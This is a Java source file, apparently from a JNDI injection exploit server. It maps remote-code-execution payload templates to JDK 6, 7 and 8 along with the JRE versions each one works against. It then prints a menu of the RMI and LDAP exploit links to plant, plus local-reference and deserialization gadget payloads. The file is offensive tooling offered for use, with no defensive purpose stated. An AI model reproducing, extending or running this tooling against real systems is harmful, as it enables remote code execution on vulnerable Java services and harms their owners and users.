package util;

import static run.ServerStart.withColor;

import java.util.*;
import payloads.face.ObjectPayload;


/**
 * @Classname Mapper
 * @Description Init the JNDI links
 */
public class Mapper {

    public final static Map<String,String> references = new HashMap<>();
    public final static Map<String,String> instructions = new HashMap<>();
    public final static Map<String,String> references1 = new HashMap<>();
    public final static Map<String,String> instructions1 = new HashMap<>();
    public final static Map<String,String> references2 = new HashMap<>();
    public final static Map<String,String> instructions2 = new HashMap<>();
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_GREEN = "\u001B[32m";


    static {
        references.put("remoteExploit8", "ExecTemplateJDK8");
        references.put("remoteExploit7", "ExecTemplateJDK7");
        references.put("remoteExploit6", "ExecTemplateJDK6");
        instructions.put("ExecTemplateJDK8", withColor("[RCE]", ANSI_YELLOW) + withColor(" Build in JDK 1.8", ANSI_GREEN) + withColor("\n  <Dependencies>: trustURLCodebase is true [RMI: JRE<8u121] [LDAP: JRE<8u182]", ANSI_RED) + withColor("\n  <Example CMD> : '/System/Applications/Calculator.app/Contents/MacOS/Calculator'", ANSI_BLUE));
        instructions.put("ExecTemplateJDK7", withColor("[RCE]", ANSI_YELLOW) + withColor(" Build in JDK 1.7", ANSI_GREEN) + withColor("\n  <Dependencies>: trustURLCodebase is true [RMI: JRE<7u131] [LDAP: JRE<7u191]", ANSI_RED) + withColor("\n  <Example CMD> : '/System/Applications/Calculator.app/Contents/MacOS/Calculator'", ANSI_BLUE));
        instructions.put("ExecTemplateJDK6", withColor("[RCE]", ANSI_YELLOW) + withColor(" Build in JDK 1.6", ANSI_GREEN) + withColor("\n  <Dependencies>: trustURLCodebase is true [RMI: JRE<6u141] [LDAP: JRE<6u201]", ANSI_RED) + withColor("\n  <Example CMD> : '/System/Applications/Calculator.app/Contents/MacOS/Calculator'", ANSI_BLUE));

        List<PayloadClassInfo> payloadClassInfos;

        System.out.println("----------------------------JNDI Remote Refenrence Links---------------------------- ");
        List<String> keys = new ArrayList<>(references.keySet());
        Collections.sort(keys);
        for (String name : keys) {
            String reference = references.get(name);
            System.out.println("- Target environment: " + instructions.get(reference));
            System.out.println(withColor("  <EXP Address> : [rmiADDRESS|ldapADDRESS]/" + name, ANSI_PURPLE));
        }
        System.out.println();

        System.out.println("----------------------------JNDI Local Refenrence Links---------------------------- ");
        payloadClassInfos = ObjectPayload.getPayloadClassInfo("payloads.reference");
        for (PayloadClassInfo payloadClassInfo : payloadClassInfos) {
            System.out.println("- Target environtment: "+withColor(payloadClassInfo.ClassName, ANSI_GREEN));
            System.out.println(withColor("  <Auhtor>           : "+payloadClassInfo.Author, ANSI_GREEN));
            System.out.println(withColor("  <Dependencies>     : "+payloadClassInfo.Dependencies, ANSI_RED));
            System.out.println(withColor("  <EXP Address>      : [rmiADDRESS|ldapADDRESS]/local"+payloadClassInfo.ClassName, ANSI_PURPLE));
        }
        System.out.println();

        System.out.println("-----------------------------JNDI Deserialization Links---------------------------- ");
        payloadClassInfos = ObjectPayload.getPayloadClassInfo("payloads.deserial");
        for (PayloadClassInfo payloadClassInfo : payloadClassInfos) {
            System.out.println("- Target environtment: "+withColor(payloadClassInfo.ClassName, ANSI_GREEN));
            System.out.println(withColor("  <Auhtor>           : "+payloadClassInfo.Author, ANSI_GREEN));
            System.out.println(withColor("  <Dependencies>     : "+payloadClassInfo.Dependencies, ANSI_RED));
            System.out.println(withColor("  <EXP Address>      : [ldapADDRESS]/deserial"+payloadClassInfo.ClassName, ANSI_PURPLE));
        }
    }

}
